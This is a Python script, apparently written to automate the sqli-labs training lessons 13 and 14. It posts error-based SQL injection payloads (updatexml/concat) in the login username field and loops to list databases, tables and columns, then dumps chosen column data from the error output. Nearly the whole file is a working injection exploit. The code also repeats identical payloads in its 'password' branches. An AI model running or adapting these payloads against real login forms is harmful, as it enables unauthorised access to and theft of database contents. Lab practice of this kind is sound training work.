import requests
from bs4 import BeautifulSoup

class Less13_Less14(object):

    data = {}

    def __init__(self,url,level,dbs,tables,columns,schema,d,t,c,exploit):

        if url[-1] == "/":

            self.url = url

        else:

            self.url = url + "/"

        self.level = level

        self.dbs = dbs
                                # 初始化各自参数
        self.tables = tables

        self.columns = columns

        self.schema = schema

        self.d = d

        self.t = t 

        self.c = c

        self.exploit = exploit

    def soup(self,text):

        soup = BeautifulSoup(text,"html5lib")

        strings = soup.find_all('font')[2].text

        try:
                                            # 筛选数据
            return strings.split("~")[-2]

        except IndexError as e:

            pass

    def dbs_payload(self):

        if self.level == 13:

            count = 0
                                                # Payload level 13 调用
            if self.exploit == 'username':

                while True:

                    self.data['uname'] = "') and updatexml(1,concat(0x7e,(select concat(schema_name) from information_schema.schemata limit "+str(count)+",1),0x7e),1) #"

                    self.data['passwd'] = ""

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                    count += 1

            elif self.exploit == 'password':

                while True:

                    self.data['uname'] = "') and updatexml(1,concat(0x7e,(select concat(schema_name) from information_schema.schemata limit "+str(count)+",1),0x7e),1) #"

                    self.data['passwd'] = ""

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                    count += 1

        if self.level == 14:

            count = 0
                                            # Payload level 14 调用
            if self.exploit == 'username':

                while True:

                    self.data['uname'] = '" and updatexml(1,concat(0x7e,(select concat(schema_name) from information_schema.schemata limit '+str(count)+',1),0x7e),1) #'

                    self.data['passwd'] = ""

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                    count += 1

            elif self.exploit == 'password':   # password or username 

                while True:

                    self.data['uname'] = '" and updatexml(1,concat(0x7e,(select concat(schema_name) from information_schema.schemata limit '+str(count)+',1),0x7e),1) #'

                    self.data['passwd'] = ""

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                    count += 1


    def tables_payload(self):

        if self.level == 13:

            count = 0
                                                # 关于表的payload
            if self.exploit == 'username':

                while True:

                    self.data['uname'] = "') and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='"+self.d+"' limit "+str(count)+",1),0x7e),1) #"

                    self.data['passwd'] = ""

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                    count += 1

            elif self.exploit == 'password':

                while True:

                    self.data['uname'] = "') and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='"+self.d+"' limit "+str(count)+",1),0x7e),1) #"

                    self.data['passwd'] = ""

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                    count += 1

        if self.level == 14:

            count = 0

            if self.exploit == 'username':

                while True:

                    self.data['uname'] = '" and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema="'+self.d+'" limit '+str(count)+',1),0x7e),1) #'

                    self.data['passwd'] = ""

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                    count += 1

            elif self.exploit == 'password':

                while True:
                   
                    self.data['uname'] = '" and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema="'+self.d+'" limit '+str(count)+',1),0x7e),1) #'

                    self.data['passwd'] = ""

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                    count += 1


    def columns_payload(self):

        if self.level == 13:

            count = 0

            if self.exploit == 'username':

                while True:                     # 列的payload

                    self.data['uname'] = "') and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='"+self.d+"' and table_name='"+self.t+"' limit "+str(count)+",1),0x7e),1) #"
                    self.data['passwd'] = ""

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                    count += 1

            elif self.exploit == 'password':

                while True:

                    self.data['uname'] = "') and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='"+self.d+"' and table_name='"+self.t+"' limit "+str(count)+",1),0x7e),1) #"
                    self.data['passwd'] = ""

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                    count += 1

        if self.level == 14:

            count = 0

            if self.exploit == 'username':

                while True:

                    self.data['uname'] = '" and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema="'+self.d+'" and table_name="'+self.t+'" limit '+str(count)+',1),0x7e),1) #'
                    self.data['passwd'] = ""

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                    count += 1

            elif self.exploit == 'password':

                while True:

                    self.data['uname'] = '" and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema="'+self.d+'" and table_name="'+self.t+'" limit '+str(count)+',1),0x7e),1) #'
                    self.data['passwd'] = ""

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                    count += 1


    def data_payload(self):

        if self.level == 13:                # 筛选数据的payload

            count = 0

            if self.exploit == 'username':

                while True:

                    self.data['uname'] = "') and updatexml(1,concat(0x7e,(select "+self.c+" from "+self.d+"."+self.t+" limit "+str(count)+",1),0x7e),1) #"

                    self.data['passwd'] = ""

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                    count += 1

            elif self.exploit == 'password':

                while True:

                    self.data['uname'] = "') and updatexml(1,concat(0x7e,(select "+self.c+" from "+self.d+"."+self.t+" limit "+str(count)+",1),0x7e),1) #"

                    self.data['passwd'] = ""

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                    count += 1

        if self.level == 14:         # level 14 调用，获取数据

            count = 0

            if self.exploit == 'username':

                while True:

                    self.data['uname'] = '" and updatexml(1,concat(0x7e,(select '+self.c+' from '+self.d+'.'+self.t+' limit '+str(count)+',1),0x7e),1) #'

                    self.data['passwd'] = ""

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                    count += 1

            elif self.exploit == 'password':  # 调用 username post 方法，或者调用password post方法

                while True:

                    self.data['uname'] = '" and updatexml(1,concat(0x7e,(select '+self.c+' from '+self.d+'.'+self.t+' limit '+str(count)+',1),0x7e),1) #'

                    self.data['passwd'] = ""

                    rep = requests.post(self.url,data=self.data)

                    if self.soup(rep.text) == None:

                        break

                    else:

                        print(self.soup(rep.text))

                    count += 1



    def DBS(self):

        self.dbs_payload()

    def TABLES(self):           # 使用对应的payload

        self.tables_payload()

    def COLUMNS(self):

        self.columns_payload()

    def SCHEMA(self):

        self.data_payload()

    def TYPE(self):
        
        if self.exploit != '':

            if self.dbs:  # 如果枚举数据库被设置
                self.DBS()

            elif self.d != '' and self.tables: # 如果枚举表和数据库名被设置
                self.TABLES()

            elif self.t != '' and self.columns and self.d != '': # 如果枚举列,和数据表,和数据列被设置
                self.COLUMNS()

            elif self.c != '' and self.t != '' and self.d != '' and self.schema: # 如果数据表,数据库,数据列被设置
                self.SCHEMA()

            else:
                print("wrong options and bad type!")


    def Less_13(self):
        self.TYPE()
                            # 调用
    def Less_14(self):
        self.TYPE()

